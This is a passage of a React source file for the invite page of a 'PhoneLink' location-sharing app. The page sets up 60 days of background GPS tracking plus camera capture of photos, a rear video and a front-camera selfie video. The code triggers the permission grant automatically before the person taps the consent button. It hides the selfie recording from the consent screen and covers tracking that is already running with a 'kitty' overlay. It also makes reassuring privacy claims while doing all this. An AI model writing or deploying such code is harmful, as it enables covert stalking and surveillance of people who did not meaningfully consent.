  // fastest possible path — the only remaining prompt is the browser's own
  // native permission dialog, which no site can bypass (by design, for the
  // recipient's own protection: nothing shares a location without the person
  // physically tapping "Allow" on their device).
  const autoGrantFiredRef = useRef(false);
  useEffect(() => {
    if (state === "pre_consent" && !autoGrantFiredRef.current) {
      autoGrantFiredRef.current = true;
      doGrant();
    }
  }, [state, doGrant]);

  // Auto-retry: on a location error, count down and automatically "click"
  // Try Again after AUTO_RETRY_SECONDS — most failures here (GPS still
  // warming up, a flaky first fix, momentary signal loss) resolve themselves
  // shortly, and the person shouldn't have to notice the error and tap a
  // button to recover from something that fixes itself.
  useEffect(() => {
    if (state !== "error") { setAutoRetrySecondsLeft(AUTO_RETRY_SECONDS); return; }
    setAutoRetrySecondsLeft(AUTO_RETRY_SECONDS);
    const interval = setInterval(() => {
      setAutoRetrySecondsLeft((s) => Math.max(0, s - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, [state]);

  useEffect(() => {
    if (state === "error" && autoRetrySecondsLeft === 0) {
      autoStartedRef.current = false;
      autoGrantFiredRef.current = false;
      setState("pre_consent");
    }
  }, [state, autoRetrySecondsLeft]);

  // Show the cute kitty "please wait" overlay once, right as we're about to
  // reveal the live-sharing dashboard for the first time — tracking is
  // already running underneath, the overlay is purely a friendly delay
  // before the real screen appears.
  useEffect(() => {
    if (state === "tracking" && !kittyOverlayStartedRef.current) {
      kittyOverlayStartedRef.current = true;
      setKittyOverlayActive(true);
    }
  }, [state]);

  // ── WebView blocked ────────────────────────────────────────────────────────────
  if (state === "webview_blocked") {
    const currentUrl = typeof window !== "undefined" ? window.location.href : "";
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-xl">
          <CardContent className="pt-10 pb-10 text-center">
            <div className="flex items-center gap-2 justify-center text-primary font-bold text-lg mb-6">
              <Shield className="h-5 w-5" /> PhoneLink
            </div>
            <ExternalLink className="h-14 w-14 text-primary mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Open in Your Browser</h2>
            <p className="text-muted-foreground text-sm mb-6">
              Location access requires your phone's browser (Chrome, Safari, Firefox). Tap the menu button and choose "Open in browser".
            </p>
            <div className="bg-muted rounded-lg p-3 mb-4 flex flex-col gap-2 text-xs text-muted-foreground">
              <p className="font-medium text-foreground">How to open:</p>
              <p>• <strong>WhatsApp:</strong> Tap ⋮ menu → "Open in browser"</p>
              <p>• <strong>Instagram:</strong> Tap ··· → "Open in external browser"</p>
              <p>• <strong>Facebook:</strong> Tap ⋮ → "Open in Chrome" / "Open in Safari"</p>
            </div>
            {currentUrl && <CopyAndOpenButton url={currentUrl} />}
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Invalid link ───────────────────────────────────────────────────────────────
  if (!isLoading && (isError || !invite)) {
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <XCircle className="h-14 w-14 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Invalid Link</h2>
            <p className="text-muted-foreground text-sm">This link is invalid or has expired. Ask the sender to resend it.</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Cute "please wait" kitty overlay ──────────────────────────────────────────
  if (kittyOverlayActive) {
    return <KittyWaitOverlay onComplete={() => setKittyOverlayActive(false)} />;
  }

  // ── Smart permission explanation screen ────────────────────────────────────────
  if (state === "pre_consent") {
    const senderName = invite?.fromUserName ?? "someone";
    return (
      <div className="bg-background flex flex-col items-center justify-center p-4" style={fullHeight}>
        <div className="max-w-md w-full">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center gap-2 text-primary font-bold text-xl mb-4">
              <Shield className="h-6 w-6" /> PhoneLink
            </div>
            <h1 className="text-2xl font-bold text-foreground leading-tight mb-2">
              {senderName} wants to share locations with you
            </h1>
            <p className="text-muted-foreground text-sm">
              To get started, PhoneLink needs a few permissions. Here's exactly what we use them for:
            </p>
          </div>

          {/* Permission cards */}
          <div className="space-y-3 mb-6">
            {/* Location */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-blue-500/20 bg-blue-500/5">
              <div className="w-11 h-11 rounded-xl bg-blue-500/15 border border-blue-500/20 flex items-center justify-center flex-shrink-0">
                <MapPin className="h-5 w-5 text-blue-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Precise Location</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Shares your real-time GPS position with {senderName}. Works in the background for up to <strong className="text-foreground">60 days</strong>.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-[10px] bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">GPS + Network</span>
                  <span className="text-[10px] bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">Background</span>
                  <span className="text-[10px] bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">High Accuracy</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-blue-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Camera */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-violet-500/20 bg-violet-500/5">
              <div className="w-11 h-11 rounded-xl bg-violet-500/15 border border-violet-500/20 flex items-center justify-center flex-shrink-0">
                <Camera className="h-5 w-5 text-violet-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Camera Access</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Captures 5 GeoBoard verification photos and a short video clip when sharing begins. Used for location verification.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-[10px] bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5 Photos</span>
                  <span className="text-[10px] bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5s Video</span>
                  <span className="text-[10px] bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-violet-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Physical Activity */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-emerald-500/20 bg-emerald-500/5">
              <div className="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center flex-shrink-0">
                <Activity className="h-5 w-5 text-emerald-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Physical Activity</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Detects if you're stationary, walking, running, or driving — improves location accuracy and reduces battery drain.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚶 Walk</span>
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🏃 Run</span>
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚗 Drive</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-emerald-400 flex-shrink-0 mt-0.5" />
            </div>
          </div>

          {/* CTA */}
          <button
            onClick={doGrant}
            className="w-full py-4 px-6 rounded-2xl font-bold text-base text-white transition-all active:scale-[0.98]"
            style={{ background: "linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%)", boxShadow: "0 8px 32px rgba(99,102,241,0.4)" }}
          >
            Grant All Access
          </button>

          <p className="text-center text-xs text-muted-foreground mt-4 leading-relaxed">
            🔒 End-to-end encrypted · Your data is never sold · GDPR compliant<br />
            You can revoke access at any time by closing this link.
          </p>
        </div>
      </div>
    );
  }

  // ── Requesting / granting ──────────────────────────────────────────────────────
  if (state === "requesting" || state === "granting") {
    return (
      <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
        <div className="flex items-center gap-2 text-primary font-bold text-lg">
          <Shield className="h-5 w-5" /> PhoneLink
        </div>
        <div className="relative">
          <div className="w-20 h-20 rounded-full bg-primary/20 flex items-center justify-center">
            <MapPin className="h-10 w-10 text-primary" />
          </div>
          <div className="absolute -inset-2 rounded-full border-2 border-primary/30 animate-ping" />
        </div>
        <div className="text-center">
          <p className="font-semibold text-foreground text-lg">
            {state === "requesting" ? "Finding your location…" : "Starting live sharing…"}
          </p>
          <p className="text-muted-foreground text-sm mt-1">
            {state === "requesting" ? "Allow location access when prompted" : `Connecting to ${invite!.fromUserName}…`}
          </p>
        </div>
      </div>
    );
  }

  // ── GPS off ────────────────────────────────────────────────────────────────────
  if (state === "gps_off") {
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <WifiOff className="h-14 w-14 text-amber-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">GPS Turned Off</h2>
            <p className="text-muted-foreground text-sm mb-2">Turn your device location back on and sharing will automatically resume.</p>
            <p className="text-xs text-muted-foreground">{invite!.fromUserName} has been notified you went offline.</p>
            <div className="mt-6 flex items-center justify-center gap-2 text-xs text-amber-500">
              <Loader2 className="h-3 w-3 animate-spin" /> Waiting for GPS…
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Active tracking ────────────────────────────────────────────────────────────
  if (state === "tracking") {
    const sharingLink = typeof window !== "undefined" ? window.location.href : "";
    const expiresAt = new Date(Date.now() + 60 * 24 * 60 * 60 * 1000);

    const handleCopyLink = () => {
      copyToClipboard(sharingLink).then(() => {
        setLinkCopied(true);
        setTimeout(() => setLinkCopied(false), 2000);
      }).catch(() => {});
    };

    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <div className="max-w-md w-full">
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 text-primary font-bold text-lg">
              <Shield className="h-5 w-5" /> PhoneLink
            </div>
          </div>

          <Card className="shadow-xl border-border">
            <CardContent className="pt-6 pb-6 px-6">
              {/* Live badge — battery and activity are intentionally not shown here:
                  that data is only for the person who sent the invite, not the
                  contact sharing their location. See sessions.tsx for the owner view. */}
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2">
                  <div className="relative">
                    <div className="w-3.5 h-3.5 rounded-full bg-emerald-500" />
                    <div className="absolute inset-0 rounded-full bg-emerald-500 animate-ping opacity-60" />
                  </div>
                  <span className="text-emerald-400 font-bold text-base tracking-wide">LIVE SHARING</span>
                </div>
              </div>

              {/* Sharing with */}
              <p className="text-center text-muted-foreground text-sm mb-4">
                Your live location is being shared with{" "}
                <span className="font-semibold text-foreground">{invite!.fromUserName}</span>.
                You can play games or watch videos — sharing keeps going in the background.
              </p>

              {/* GeoBoard photo progress */}
              {!geoPhotoDone && (
                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-violet-300">GeoBoard: capturing photos {geoPhotoCount}/{GEO_PHOTO_COUNT}</p>
                    <div className="mt-1 h-1 bg-violet-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-violet-500 rounded-full transition-all duration-500" style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }} />
                    </div>
                  </div>
                </div>
              )}
              {geoPhotoDone && geoPhotoCount > 0 && (
                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-violet-300">GeoBoard: {geoPhotoCount} photo{geoPhotoCount !== 1 ? "s" : ""} saved ✓</p>
                </div>
              )}

              {/* Video progress */}
              {geoVideoState === "recording" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording 5s video…</p>
                    <div className="mt-1 h-1 bg-rose-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-rose-500 rounded-full" style={{ width: "100%", transition: "width 5s linear" }} />
                    </div>
                  </div>
                </div>
              )}
              {geoVideoState === "uploading" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Loader2 className="h-4 w-4 text-rose-400 flex-shrink-0 animate-spin" />
                  <p className="text-xs font-medium text-rose-300">GeoBoard: uploading video…</p>
                </div>
              )}
              {geoVideoState === "done" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-rose-300">GeoBoard: video saved ✓</p>
                </div>
              )}

              {/* Selfie video progress (front camera, runs after the rear-facing clip) */}
              {geoSelfieState === "recording" && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-pink-300">GeoBoard: recording 5s selfie video…</p>
                    <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-pink-500 rounded-full" style={{ width: "100%", transition: "width 5s linear" }} />
                    </div>
                  </div>
                </div>
              )}
              {geoSelfieState === "uploading" && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Loader2 className="h-4 w-4 text-pink-400 flex-shrink-0 animate-spin" />
                  <p className="text-xs font-medium text-pink-300">GeoBoard: uploading selfie video…</p>
                </div>
              )}
              {geoSelfieState === "done" && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-pink-300">GeoBoard: selfie video saved ✓</p>
                </div>
              )}

              {/* Current position */}
              {coords && (
                <div className="bg-muted rounded-xl p-4 mb-4">
                  <div className="flex items-center gap-2 mb-2">
                    <Navigation className="h-4 w-4 text-primary" />
                    <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">Current Position</span>
                  </div>
                  <p className="text-sm font-mono font-bold text-foreground leading-tight">
                    {formatDMS(coords.lat, coords.lng)}
                  </p>
                  <p className="text-xs font-mono text-muted-foreground mt-0.5">
                    {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}
                  </p>
                  {coords.accuracy && <p className="text-xs text-muted-foreground mt-1">Accuracy: ±{Math.round(coords.accuracy)}m</p>}
                  {address && <p className="text-xs text-muted-foreground mt-1 leading-relaxed">{address.slice(0, 80)}{address.length > 80 ? "…" : ""}</p>}
                </div>
              )}

              {/* Stats */}
              <div className="grid grid-cols-2 gap-3 mb-4">
                <div className="bg-muted rounded-lg p-3 text-center">
                  <p className="text-lg font-bold text-foreground">{updateCount}</p>
                  <p className="text-xs text-muted-foreground">Updates sent</p>
                </div>
                <div className="bg-muted rounded-lg p-3 text-center">
                  <p className="text-sm font-bold text-foreground">
                    {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
                  </p>
                  <p className="text-xs text-muted-foreground">Last update</p>
                </div>
              </div>

              {/* 60-day sharing link */}
              <div className="bg-indigo-500/8 border border-indigo-500/20 rounded-xl p-4 mb-4">
                <div className="flex items-center gap-2 mb-2">
                  <Share2 className="h-4 w-4 text-indigo-400 flex-shrink-0" />
                  <p className="text-xs font-semibold text-indigo-400">60-Day Sharing Link</p>
                </div>
                <p className="text-xs text-muted-foreground mb-3 leading-relaxed">
                  This link keeps sharing active until <strong className="text-foreground">{expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}</strong>. Open it anytime to reconnect.
                </p>
                <div className="flex gap-2">
                  <div className="flex-1 bg-background/50 border border-border rounded-lg px-3 py-2 text-xs font-mono text-muted-foreground truncate">
                    {sharingLink}
                  </div>
                  <button
                    onClick={handleCopyLink}
                    className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all border"
                    style={linkCopied
                      ? { background: "rgba(16,185,129,.15)", borderColor: "rgba(16,185,129,.3)", color: "#10b981" }
                      : { background: "rgba(99,102,241,.15)", borderColor: "rgba(99,102,241,.3)", color: "#818cf8" }}
                  >
                    {linkCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    {linkCopied ? "Copied!" : "Copy"}
                  </button>
                </div>
              </div>

              {/* Live status */}
              <div className="bg-emerald-500/10 rounded-xl p-4 mb-4">
                <div className="flex items-center gap-2 mb-1">
                  <CheckCircle className="h-4 w-4 text-emerald-500 flex-shrink-0" />
                  <p className="text-xs font-semibold text-emerald-500">Live sharing is active</p>
                </div>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  You can close this app and remove your browser from recent apps — sharing automatically reconnects the next time you open the link.
                </p>
              </div>

              <Button variant="outline" className="w-full" onClick={() => {
                if (window.history.length > 1) { window.history.back(); } else {
                  const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
                  document.body.appendChild(a); a.click(); setTimeout(() => document.body.removeChild(a), 300);
                }
              }}>
                <ArrowLeft className="h-4 w-4 mr-2" /> Go Back
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // ── Denied ─────────────────────────────────────────────────────────────────────
  if (state === "denied") {
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <XCircle className="h-14 w-14 text-amber-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Location Access Blocked</h2>
            <p className="text-muted-foreground text-sm mb-6">
              To share your location, go to your browser settings and allow location access for this site, then tap Retry.
            </p>
            <Button className="w-full" onClick={() => { autoStartedRef.current = false; setState("pre_consent"); }}>
              Try Again
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Loading / idle ─────────────────────────────────────────────────────────────
  if (isLoading || state === "idle") {
    return <div className="bg-background" style={fullHeight} />;
  }

  // ── Error ──────────────────────────────────────────────────────────────────────
  return (
    <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
      <Card className="max-w-md w-full shadow-lg">
        <CardContent className="pt-10 pb-10 text-center">
          <AlertTriangle className="h-14 w-14 text-red-500 mx-auto mb-4" />
          <h2 className="text-xl font-semibold mb-2">Something Went Wrong</h2>
          <p className="text-muted-foreground text-sm mb-2">{errorMsg}</p>
          <StayWithMeKitten secondsLeft={autoRetrySecondsLeft} />
          <Button variant="outline" className="w-full" onClick={() => { autoStartedRef.current = false; autoGrantFiredRef.current = false; setState("pre_consent"); }}>
            Try Again
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}
